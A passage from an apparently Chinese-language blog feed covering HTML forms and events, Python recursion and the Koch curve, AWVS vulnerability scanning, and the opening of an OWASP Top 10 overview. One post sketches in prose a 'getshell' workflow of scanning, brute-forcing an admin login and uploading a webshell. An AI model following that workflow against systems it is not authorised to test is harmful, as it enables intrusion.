class="headerlink" title="Mouse事件属性—onmouseover事件"></a>Mouse事件属性—onmouseover事件</h3><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;h1 onmouseover=&quot;alert(&#39;The event has been triggered&#39;)&quot;&gt;hanker&lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/wAdP5poI19yfmJF.png" alt="image-20210315185526053"></p><h3 id="HTML列表"><a href="#HTML列表" class="headerlink" title="HTML列表"></a>HTML列表</h3><p>HTML支持有序、无序列表</p><p>（1）定义无序列表：ul+li</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;ul&gt;            &lt;li&gt;咖啡&lt;/li&gt;            &lt;li&gt;茶&lt;/li&gt;            &lt;li&gt;牛奶&lt;/li&gt;        &lt;/ul&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/vtYNhQykP7JHfWM.png" alt="image-20210315190107145"></p><p>（2）定义有序列表：ol+li</p><pre><code class="html">&lt;html&gt;    &lt;body&gt;        &lt;ol&gt;            &lt;li&gt;咖啡&lt;/li&gt;            &lt;li&gt;茶&lt;/li&gt;            &lt;li&gt;牛奶&lt;/li&gt;        &lt;/ol&gt;        &lt;ol start=&quot;50&quot;&gt;           &lt;li&gt;咖啡&lt;/li&gt;           &lt;li&gt;茶&lt;/li&gt;           &lt;li&gt;牛奶&lt;/li&gt;         &lt;/ol&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/RFi12fZT4vWtKUb.png" alt="image-20210315190327677"></p><h3 id="HTML表单"><a href="#HTML表单" class="headerlink" title="HTML表单"></a>HTML表单</h3><p>（1）HTML表单用于搜集不同类型的用户输入</p><p>（2）&lt;form&gt;元素</p><ul><li>HTML表单用于收集用户输入</li></ul><p>（3）HTML表单包含表单元素。</p><ul><li>表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等。</li></ul><p>（4）&lt;input&gt;元素是最重要的表单元素</p><p>（5）&lt;input&gt;元素有很多形态，根据不同的type属性。</p><table><thead><tr><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">text</td><td align="center">定义常规文本输入</td></tr><tr><td align="center">radio</td><td align="center">定义单选按钮输入（选择多个选择之一）</td></tr><tr><td align="center">submit</td><td align="center">定义提交按钮（提交表单）</td></tr></tbody></table><h4 id="文本输入"><a href="#文本输入" class="headerlink" title="文本输入"></a>文本输入</h4><p>&lt;input type=”text”&gt;定义用于文本输入的单行输入字段</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot;/&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;/&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/bpMRWlGhvE3J9jU.png" alt="image-20210315191807882"></p><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p>（1）&lt;input type=”radio”&gt;定义单选按钮</p><p>（2）单选按钮允许用户在有限数量的选项中选择其中之一。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;/&gt;Male            &lt;br&gt;            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;/&gt;Female        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/c3WLbOfRqaQTGnv.png" alt="image-20210315192243280"></p><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p>（1）&lt;input type=”submit”&gt;定义用于向表单处理程序提交表单的按钮</p><p>（2）表单处理程序通常是包含用来处理输入数据的脚本的服务器页面</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form action=&#39;form.php&#39;&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot;/&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;/&gt;            &lt;br&gt;            &lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/uWx9OeFcNGq3bHM.png" alt="image-20210315192941921"></p><p><img src="https://i.loli.net/2021/03/15/UnsfAECtjNOgGla.png" alt="image-20210315193009434"></p><h4 id="各种框总结"><a href="#各种框总结" class="headerlink" title="各种框总结"></a>各种框总结</h4><ul><li>文本框：text</li><li>隐藏文本框：hidden</li><li>密码框：password</li><li>多选框：checkbox</li><li>单选框：radio</li><li>提交按钮：submit</li><li>重置按钮：reset</li><li>多选框：select、option</li></ul><h4 id="action属性"><a href="#action属性" class="headerlink" title="action属性"></a>action属性</h4><p>（1）action属性定义在提交表单时执行的动作</p><p>（2）向服务器提交表单通常做法是使用提交按钮</p><p>（3）通常，表单会被提交到web服务器上的网页</p><pre><code class="html">&lt;form action=&quot;action_page.php&quot;&gt;</code></pre><p>（4）如果省略action属性，则action会被设置为当前页面</p><h4 id="method属性"><a href="#method属性" class="headerlink" title="method属性"></a>method属性</h4><p>（1）method属性规定在提交表单时所用的HTTP方法(GET或POST)</p><pre><code class="html">&lt;form action=&quot;action_page.php&quot; method=&quot;GET&quot;&gt;&lt;form action=&quot;action_page.php&quot; method=&quot;POST&quot;&gt;</code></pre><p>（2）如果表单提交是被动的（比如搜索引擎查询），并且没有敏感信息。表单数据在页面地址栏是可见的。这时使用GET.</p><pre><code>action_page.php?firstname=Mickey&amp;lastname=Mouse</code></pre><p>（3）如果表单正在更新数据，或者包含敏感信息(例如密码）。POST的安全性更佳，因为在页面地址栏中被提交的数据是不可见的。</p><h4 id="校验函数"><a href="#校验函数" class="headerlink" title="校验函数"></a>校验函数</h4><p>onsubmit事件在表单提交时触发，当检验不通过时，就不会提交表单内容。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;login&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h3&gt;            Login Please        &lt;/h3&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            function check()&#123;                alert(&quot;check函数被触发了~&quot;)                return true   //此处改为false就不会提交，会返回false            &#125;        &lt;/script&gt;        &lt;form action=&quot;/login.php&quot; method=&quot;post&quot; onsubmit=&quot;return check()&quot;&gt;            姓名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;            密码：&lt;input type=&quot;text&quot; password=&quot;password&quot;&gt;&lt;br&gt;            &lt;input value=&quot;提交&quot; type=&quot;submit&quot; name=&quot;submit&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/Y1lJreIVGRN7zKo.png" alt="image-20210315203458505"></p><h3 id="HTML的form属性"><a href="#HTML的form属性" class="headerlink" title="HTML的form属性"></a>HTML的form属性</h3><p><img src="https://i.loli.net/2021/03/15/1jKqzZuAaE8GdsX.png" alt="image-20210315194714650"></p><h3 id="常见的输入限制"><a href="#常见的输入限制" class="headerlink" title="常见的输入限制"></a>常见的输入限制</h3><p><img src="https://i.loli.net/2021/03/15/cX2CD8gmvsU5NM4.png" alt="image-20210315194834108"></p><h4 id="value属性"><a href="#value属性" class="headerlink" title="value属性"></a>value属性</h4><p>value属性规定输入字段的初始值</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot;&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/EQ3ZUHK25VmNazJ.png" alt="image-20210315200004163"></p><h4 id="readonly属性"><a href="#readonly属性" class="headerlink" title="readonly属性"></a>readonly属性</h4><p>（1）readonly属性规定输入字段为只读（不能修改），可以提交元素</p><p>（2）readonly属性不需要值。它等同于readonly=”readonly”</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot; readonly&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/C5cdxHKPrQlEyks.png" alt="image-20210315200652188"></p><h4 id="disabled属性"><a href="#disabled属性" class="headerlink" title="disabled属性"></a>disabled属性</h4><p>（1）disabled属性规定输入字段是禁用的。</p><p>（2）被禁用的元素是不可用和不可点击的，且被禁用的元素不会被提交</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form action=&quot;&quot;&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot; disabled&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/8coQvE591CNPrse.png" alt="image-20210315201127969"></p><h4 id="maxlength属性"><a href="#maxlength属性" class="headerlink" title="maxlength属性"></a>maxlength属性</h4><p>（1）maxlength属性规定输入字段允许的最大长度，如设置maxlength属性，则输入控件不会接受超过所允许数的字符。</p><p>（2）该属性不会提供任何反馈，如果需要提醒用户，则必须编写JavaScript代码。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; maxlength=&quot;5&quot;&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/G3P7WS9TyxmajAC.png" alt="image-20210315202015566"></p><h3 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h3><p>（1）HTML的文档对象模型</p><p>（2）HTML的标准编程接口</p><p>（3）HTML DOM定义了所有HTML元素的对象和属性，以及访问他们的方法。</p><p>（4）换言之，HTML DOM 是关于如何获取、修改、添加或删除HTML元素的标准。</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;title&gt;文档标题&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href=&quot;http://since1994.cn&quot;&gt;我的链接&lt;/a&gt;        &lt;h1&gt;            我的标题        &lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/6B3MxtUWLwaRqK5.png" alt="image-20210315204251708"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(六)-函数和代码复用02</title>
      <link href="2021/02/11/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AD)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A802/"/>
      <url>2021/02/11/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AD)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A802/</url>
      
        <content type="html"><![CDATA[<h2 id="代码复用和模块化设计"><a href="#代码复用和模块化设计" class="headerlink" title="代码复用和模块化设计"></a>代码复用和模块化设计</h2><p><strong>要点：函数是程序的一种抽象，它通过封装实现代码复用，可以利用函数对程序进行模块化设计</strong></p><p>（1）程序代码若是顺序但无组织的，不仅不利于阅读和理解，也很难进行升级和维护。因此，需要对代码进行抽象，形成易于理解的结构。当代编程语言从代码层面采用函数和对象两种抽象方式，分别对应<strong>面向过程和面向对象编程思想。</strong></p><p>（2）函数封装的直接好处是代码复用，从而避免相同功能代码在调用出重复编写。代码复用产生了另一个好处，当更新函数功能时，所有被调用处的功能都被更新。</p><p>（3）面向过程是一种以过程描述为主要方法的编程方式，该方法要求列出解决问题所需要的步骤，再用函数将这些步骤逐一实现，使用时依次建立并调用函数或编写语句即可。这是一种基本且自然的程序设计方法，函数通过将步骤或子功能封装实现代码复用并简化程序设计难度。</p><p>（4）面向对象编程：对象是程序的一种高级抽象方式，它将程序代码组织为更高级的类。对象包括表征对象特征的属性和代表对象操作的方法。在程序设计中，若&lt;a&gt;代表对象，获取其属性&lt;b&gt;采用&lt;a&gt;.&lt;b&gt;，调用其方法&lt;c&gt;采用&lt;a&gt;.&lt;c&gt;()。对象的方法具有程序功能性，因此采用函数形式封装。对象可以凝聚更多代码，所以面向对象编程更适合代码规模较大，交互逻辑复杂的程序。</p><p>（5）Python语言同时支持面向过程和面向对象两种编程方式。无论是面向过程还是面向对象编程，对程序合理划分功能模块并基于模块设计程序是一种常用方法，被称为“模块化设计”，即将一个程序分隔成短小的程序段，每一段程序完成一个小的功能。</p><h2 id="函数的递归"><a href="#函数的递归" class="headerlink" title="函数的递归"></a>函数的递归</h2><h3 id="递归的定义"><a href="#递归的定义" class="headerlink" title="递归的定义"></a>递归的定义</h3><p>（1）函数定义中调用函数自身的方式称为递归。例如数学中的阶乘</p><p><img src="https://i.loli.net/2021/02/11/AmfsY7pe3naKUHS.png" alt="image-20210211152129282"></p><p>（2）递归的两个关键特征：</p><ul><li>存在一个或多个基例(例如0!)，基例不需要再次递归，它是确定的表达示或已知的值。</li><li>所有递归链要以一个或多个基例结尾</li></ul><h3 id="递归的使用方法"><a href="#递归的使用方法" class="headerlink" title="递归的使用方法"></a>递归的使用方法</h3><p>（1）实例：阶乘的计算：根据用户输入的整数n，计算并输出n的阶乘值。</p><pre><code class="python">def fact(n):    if n == 0:        return 1    else:        return n*fact(n-1)num = eval(input(&quot;请输入一个整数：&quot;))print(fact(abs(int(num))))</code></pre><p>（2）fact()函数在其定义内部引用了自身，形成了递归过程(第5行)。无限制的递归将耗尽计算资源，因此需要设计基例使得递归逐层返回。fact()函数通过if语句给出了n为0时的基例，当n==0，fact()函数不再递归，返回数值1，若n!=0,则通过递归返回n与n-1阶乘的乘积。</p><p>（3）由于负数和小数通过减一无法达到递归的基例(n==0)，代码第7行通过abs()和int()函数将用户输入转变成非负整数。</p><p>（4）递归遵循函数第语义，每次调用都会引起新函数的开始，表示它有本地变量值的副本，包括函数的参数。每次调用时，函数参数的副本会临时存储，递归中各函数在运算自己的参数，互不影响。当基例结束运算并返回值时，各函数逐层结束运算，向调用者返回计算结果。</p><p><strong>注意：使用递归一定要注意基例的构建，否则递归无法返回将会报错。</strong></p><p>（5）实例：字符串反转：对于用户输入的字符串s，输出反转后的字符串。</p><p>解决问题的基本思想：把一个字符串看成仅由首字符和剩余字符串两部分组成，若将剩余字符串和首字符交换，就完成了反转整个字符串。代码如下：</p><pre><code class="python">&gt;&gt;&gt; def reverse(s):    return reverse(s[1:]) + s[0]    #s[0]是首字符，s[1:]是剩余字符串&gt;&gt;&gt; reverse(&quot;abc&quot;)Traceback (most recent call last):  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;    reverse(&quot;abc&quot;)  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse    return reverse(s[1:]) + s[0]  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse    return reverse(s[1:]) + s[0]  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse    return reverse(s[1:]) + s[0]  [Previous line repeated 991 more times]RecursionError: maximum recursion depth exceeded</code></pre><p>（6）上述代码出错，该错误表明系统无法执行reverse()函数创建的递归，这是因为reverse()函数没有基例，递归层数超过了系统允许的最大递归深度。默认情况下，当递归调用到1000层，Python解释器将终止程序。递归深度是为了防止无限递归错误而设计的，当用户编写的正确递归程序需要超过1000层时，可以通过如下代码设定。</p><pre><code class="python">&gt;&gt;&gt;import sys&gt;&gt;&gt;sys.setrecursionlimit(2000)    #2000是新的递归层数</code></pre><p>（7）reverse()函数超过递归深度是因为没有设计基例。可以把基例设计为字符串的最短形式，即空字符串。代码如下：</p><pre><code class="python">def reverse(s):    if s == &quot;&quot;:        return s    else:        return reverse(s[1:]) + s[0]str = input(&quot;请输入一个字符串：&quot;)print(reverse(str))</code></pre><h2 id="实例：科赫曲线绘制"><a href="#实例：科赫曲线绘制" class="headerlink" title="实例：科赫曲线绘制"></a>实例：科赫曲线绘制</h2><p>（1）科赫曲线在众多经典数学曲线中非常著名，由于其形状类似雪花，也被称为雪花曲线。</p><p>（2）正整数n代表科赫曲线的阶数，表示生成科赫曲线过程的操作次数。科赫曲线初始化阶数为0，表示一个长度为L的直线。对于直线L，将其等分为3段，中间一段用边长为L/3的等边三角形的两个边代替，得到1阶科赫曲线，它包含4条线段。进一步对每条线段重复同样的操作后得到2阶科赫曲线。继续重复同样的操作n次可以得到n阶科赫曲线。</p><p><img src="https://i.loli.net/2021/02/11/2GwhWLdFHp6fSTv.png" alt="image-20210211210938960"></p><p>（3）科赫曲线属于分形几何分支，其绘制过程体现了递归思想，绘制过程代码如下：</p><pre><code class="python">import turtledef koch(size, n):    if n==0:        turtle.fd(size)    else:        for angle in [0, 60, -120, 60]:            turtle.left(angle)            koch(size/3, n-1)def main():    turtle.setup(800,400)    turtle.speed(0)          #控制绘制速度    turtle.penup()    turtle.goto(-300,-50)    turtle.pendown()    turtle.pensize(2)    koch(600,3)              #0阶科赫曲线长度，阶数    turtle.hideturtle()main()</code></pre><p>（4）n阶科赫曲线的绘制相当于在画笔前进方向的0°、60°、-120°和60°分别绘制n-1阶曲线。在给定初始图形后，通过科赫曲线可以生成很多漂亮的图形。代码如下。</p><pre><code class="python">import turtledef koch(size, n):    if n == 0:        turtle.fd(size)    else:        for angle in [0, 60, -120, 60]:            turtle.left(angle)            koch(size/3, n-1)def main():    turtle.setup(600,600)    turtle.speed(0)    turtle.penup()    turtle.goto(-200,100)    turtle.pendown()    turtle.pensize(2)    level=5    koch(400,level)    turtle.right(120)    koch(400,level)    turtle.hideturtle()main()</code></pre><h2 id="Python内置函数"><a href="#Python内置函数" class="headerlink" title="Python内置函数"></a>Python内置函数</h2><p>（1）Python解释器提供了68个内置函数，这些函数不需要引用库直接使用。以下对部分函数进行说明</p><p>（2）all()函数一般针对组合数据类型，如果其中每个元素都是True，则返回True，否则返回False。注意：整数0、空字符串””、空列表[]等都被当做False。</p><p>（3）any()函数与all()函数相反，只要组合数据中任何一个是True，则返回True，全部元素都是False才返回False。</p><p>（4）hash()函数对于能够计算哈希的类型返回哈希值。</p><p>（5）id()函数对每一个数据返回唯一编号，数据不同编号不同，可以通过比较两个变量编号是否相同判断数据是否一致。Python将数据存储在内存中的地址作为其唯一编号。</p><p>（6）reversed()函数返回输入组合数据类型的逆序形式。</p><p>（7）sorted()函数对一个序列进行排序，默认从小到大排序。</p><p>（8）type()函数返回每个数据对应的类型。</p><p>实例如下：</p><pre><code class="python">&gt;&gt;&gt; ls = [1,2,5,0]&gt;&gt;&gt; all(ls)False&gt;&gt;&gt; any(ls)True&gt;&gt;&gt; hash(&quot;中国，你好&quot;)8827663102129553702&gt;&gt;&gt; id(ls)2463935192072&gt;&gt;&gt; list(reversed(ls))[0, 5, 2, 1]&gt;&gt;&gt; sorted(ls)       #不改变ls的值[0, 1, 2, 5]&gt;&gt;&gt; ls[1, 2, 5, 0]&gt;&gt;&gt; sorted(ls, reverse=True)[5, 2, 1, 0]&gt;&gt;&gt; type(ls)&lt;class &#39;list&#39;&gt;&gt;&gt;&gt; type(reversed(ls))&lt;class &#39;list_reverseiterator&#39;&gt;</code></pre><p>（9）Python使用手册<a href="https://docs.python.org/3">https://docs.python.org/3</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞扫描与渗透测试</title>
      <link href="2021/02/01/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2021/02/01/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞扫描器AWVS"><a href="#WEB漏洞扫描器AWVS" class="headerlink" title="WEB漏洞扫描器AWVS"></a>WEB漏洞扫描器AWVS</h2><p>AWVS（Acunetix Web Vulnerability Scanner）自动化的Web漏洞扫描器，审查漏洞如SQL注入，XSS跨站脚本攻击等其他能被黑客利用存在漏洞的网页应用。</p><p>AWVS的使用步骤：</p><p>①　打开浏览器访问：<a href="https://localhost:3443（其中localhost可为存在AWVS工具的主机IP）">https://localhost:3443（其中localhost可为存在AWVS工具的主机IP）</a></p><p>②　在Targets栏，创建一个新的扫描目标</p><p>③　填写目标地址和扫描描述并点击创建目标</p><p>④　若无需登录扫描，则下一步点击scan开始扫描</p><p>⑤　选择扫描类型和报告类型，一般选择Full Scan和Affected Items</p><p>⑥　点击Create Scan开始进行扫描</p><p>⑦　可以在Scans模块查看扫描进度，和漏洞信息</p><p>⑧　在Reports，可以将扫描结果导出成PDF或者HTML格式的报告</p><h2 id="WEB漏洞扫描与验证"><a href="#WEB漏洞扫描与验证" class="headerlink" title="WEB漏洞扫描与验证"></a>WEB漏洞扫描与验证</h2><h3 id="漏洞验证的基本流程："><a href="#漏洞验证的基本流程：" class="headerlink" title="漏洞验证的基本流程："></a>漏洞验证的基本流程：</h3><p>一般步骤是：先提取关键信息–&gt;验证漏洞是否存在–&gt;判断漏洞危害性–&gt;重新记录整理报告</p><p>每个步骤所需要做到的：</p><table><thead><tr><th align="center">提取关键信息</th><th align="center">验证漏洞是否存在</th><th align="center">判断漏洞危害性</th><th align="center">漏洞记录</th></tr></thead><tbody><tr><td align="center">漏洞类型</td><td align="center">存在</td><td align="center">高风险</td><td align="center">基本信息</td></tr><tr><td align="center">漏洞位置</td><td align="center">不存在</td><td align="center">中风险</td><td align="center">验证过程</td></tr><tr><td align="center">漏洞判断依据</td><td align="center"></td><td align="center">低风险</td><td align="center">解决方案</td></tr></tbody></table><h3 id="解读漏洞报告"><a href="#解读漏洞报告" class="headerlink" title="解读漏洞报告"></a>解读漏洞报告</h3><ul><li>漏洞名称：漏洞的名称，通常包括了漏洞的具体类型</li><li>风险等级：描述漏洞的风险等级</li><li>漏洞描述：描述漏洞的基本概念、原理、产生原因等</li><li>漏洞详情：通常包括漏洞的URL、关键参数、漏洞验证payload以及漏洞判断依据等，部分扫描还会提供验证漏洞的请求包和响应包等信息</li><li>漏洞危害：描述漏洞可能会产生什么样的危害</li><li>修复建议：如何修复漏洞的建议</li><li>参考资料：包括补充说明、参考链接等，对于一些组件漏洞通常包含CVE编号或厂家的漏洞说明等</li></ul><h3 id="漏洞记录编写"><a href="#漏洞记录编写" class="headerlink" title="漏洞记录编写"></a>漏洞记录编写</h3><p>主要分为：</p><p>①　漏洞记录表：记录漏洞的类型、风险等级、漏洞描述、漏洞该位置和修复建议信息</p><p>②　漏洞验证过程记录：主要包含验证过程使用的关键payload，详细的漏洞复现步骤，并配有图文描述。</p><h2 id="WEB渗透思路"><a href="#WEB渗透思路" class="headerlink" title="WEB渗透思路"></a>WEB渗透思路</h2><p>WEB应用渗透的目标：通过webshell控制服务器，这个过程通常被称为Getshell</p><p>常见的Getshell过程：</p><p>(1) 漏洞扫描：通过扫描器发现网站存在的漏洞，重点关注SQL注入、命令执行、文件上传等漏洞。</p><p>(2) 后台发现：通过搜索引擎或扫描器发现网站后台登录页面或敏感文件。</p><p>(3) 后台登录：通过SQL注入、暴力破解、敏感文件下载等方式登录网站后台。</p><p>(4) 文件上传：查找文件上传漏洞，上传webshell控制服务器。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP与常见WEB漏洞</title>
      <link href="2021/01/23/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/OWASP%E4%B8%8E%E5%B8%B8%E8%A7%81WEB%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/23/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/OWASP%E4%B8%8E%E5%B8%B8%E8%A7%81WEB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="OWASP介绍"><a href="#OWASP介绍" class="headerlink" title="OWASP介绍"></a>OWASP介绍</h2><p>（1）OWASP是一个开源的、非盈利的全球性安全组织，致力于应用软件的安全研究。<strong>OWASP的使命是使应用软件更加安全，使企业和组织能够对应用安全风险做出更清晰的决策。</strong>截至2020年，OWASP全球拥有250个分部近7万名会员，共同推动了安全标准、安全测试工具、安全指导手册等应用安全技术的发展。</p><p>（2）官网：<a href="http://www.owasp.org.cn/">http://www.owasp.org.cn/</a></p><p>（3）OWASP TOP10指出了WEB应用面临最大风险的10类向题，是目前WEB应用安全方面最权威的项目。</p><h2 id="OWASP-TOP-10与常见漏洞讲解"><a href="#OWASP-TOP-10与常见漏洞讲解" class="headerlink" title="OWASP TOP 10与常见漏洞讲解"></a>OWASP TOP 10与常见漏洞讲解</h2><h3 id="OWASP-TOP-10-2017年版"><a href="#OWASP-TOP-10-2017年版" class="headerlink" title="OWASP TOP 10(2017年版)"></a>OWASP TOP 10(2017年版)</h3><p>A1：注入</p><p>A2：失效的身份认证</p><p>A3：敏感数据泄露</p><p>A4：XML外部实体</p><p>A5：失效的访问控制</p><p>A6：安全配置错误</p><p>A7：跨站请求脚本（XSS）</p><p>A8：跨站请求伪造（CSRF）</p><p>A9：不安全的反序列化</p><p>A10：使用含有已知漏洞的组件</p><h3 id="A1：注入"><a href="#A1：注入" class="headerlink" title="A1：注入"></a>A1：注入</h3><p>（1）注入：用户的输入被当成命令/代码执行或者解析了。</p><p>（2）SQL注入攻击指的是：通过构建特殊的输入作为参数传入WEB应用程序，改变原有的SQL语句的语义来执行攻击者所要的操作。</p><p>（3）其主要原因是：程序没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。</p><p>（4）SQL注入的危害：</p><ul><li>绕过登录验证：使用万能密码登录网站后台等。</li><li>获取敏感数据：获取网站管理员账号、密码等。</li><li>文件系统操作：列目录，读取、写入文件等。</li><li>注册表操作：读取、写入、删除注册表等。</li><li>执行系统命令：远程执行命令。</li></ul><h3 id="A2：失效的身份认证-业务逻辑漏洞"><a href="#A2：失效的身份认证-业务逻辑漏洞" class="headerlink" title="A2：失效的身份认证(业务逻辑漏洞)"></a>A2：失效的身份认证(业务逻辑漏洞)</h3><p>因为各种代码或者逻辑缺陷，导致绕过登陆或者匿名顶替登陆等</p><p>通常的漏洞存在形式：</p><ul><li>暴力破解登录</li><li>撞库</li><li>默认口令</li><li>二次校验失败</li><li>数据明文传输</li><li>URL暴露会话ID</li><li>用户登录后不会更换会话ID（固定会话攻击）</li><li>会话不会失败</li></ul><h3 id="A3：敏感数据泄漏"><a href="#A3：敏感数据泄漏" class="headerlink" title="A3：敏感数据泄漏"></a>A3：敏感数据泄漏</h3><p>许多Web应用程序和API都无法正确保护敏感数据。由于未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p><h3 id="A4：XML-外部实体（XXE）"><a href="#A4：XML-外部实体（XXE）" class="headerlink" title="A4：XML 外部实体（XXE）"></a>A4：XML 外部实体（XXE）</h3><p>XML是一种类似HTML的标记性语言，可以用来标记数据、定义数据类型，是一种允许用户对自己语言进行定义的源语言。</p><p>（1）xml引用实体格式如下：<br>&lt;!ENTITY 实体引用名 “引用内容”&gt;</p><p>（2）实体分两类：一般实体和参数实体</p><p>（3）一般实体，可以在XML文档中的任何位置出现的实体称为一般实体。实体可以声明为内部实体还是外部实体。外部实体分SYSTEM和PUBLIC两种。<br>SYSTEM引用本地计算机，PUBLIC引用公共计算机，外部实体格式如下：<br>&lt;!ENTITY 引用名 SYSTEM(PUBLIC) “URL地址”&gt;</p><h3 id="A5：失效的访问控制-业务逻辑漏洞"><a href="#A5：失效的访问控制-业务逻辑漏洞" class="headerlink" title="A5：失效的访问控制(业务逻辑漏洞)"></a>A5：失效的访问控制(业务逻辑漏洞)</h3><p>（1）失效的访问控制就是越权访问漏洞。</p><p>（2）未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><p>（3）越权访问分为垂直越权和水平越权。</p><ul><li>垂直越权：低权限用户可以访问更高权限用户才能访问的资源</li><li>水平越权：同级权限用户之间的权限控制失效</li></ul><h3 id="A6：安全配置错误"><a href="#A6：安全配置错误" class="headerlink" 